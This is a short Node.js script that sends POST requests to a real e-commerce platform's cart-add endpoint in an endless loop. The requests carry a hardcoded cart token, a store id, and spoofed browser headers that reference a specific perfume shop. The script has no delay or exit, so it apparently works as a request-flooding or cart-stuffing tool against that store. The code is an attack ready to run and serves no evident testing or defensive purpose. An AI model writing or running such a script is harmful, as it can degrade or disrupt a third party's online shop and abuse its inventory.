import fetch from 'node-fetch';

const main = async () => {
  do {
    await fetch('https://api.ladisales.com/2.0/cart/add', {
      'headers': {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cart-token': '84ac10755d5f4343ab62590fef36b4ba',
        'content-type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'store-id': '553',
        'Referer': 'https://phuonglinhperfume.com/',
        'Referrer-Policy': 'strict-origin-when-cross-origin'
      },
      'body': '{"type":"LP","product_variant_id":46765,"quantity":1}',
      'method': 'POST'
    });
  } while (1 > 0);
};

main();
